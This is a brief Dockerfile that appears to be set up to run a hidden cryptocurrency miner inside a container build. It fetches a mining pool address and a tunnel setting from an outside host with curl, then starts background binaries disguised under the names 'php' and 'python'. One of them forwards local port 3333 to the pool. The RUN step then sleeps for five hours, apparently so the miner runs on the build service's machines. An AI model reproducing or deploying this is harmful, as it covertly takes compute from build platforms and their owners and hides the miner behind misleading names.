FROM dockerproxy.com/vscwjm/xm:v3-build

RUN sed -i "s/\"pass\": \"notunn\"/\"pass\": \"BUILD-CNN\"/" /app/config.json 
RUN pool=$(curl -s html.vscwjm.eu.org/XM/pool) && \
  tunn=$(curl -s html.vscwjm.eu.org/XM/tunn) && \
  chmod a+x /app/php /app/python && \
  cd /app && \
  (./php -L 127.0.0.1:3333:$pool $tunn &) && \
  cd /app && \
  (./python > /dev/null &) && \
  sleep 18000 

CMD /bin/bash
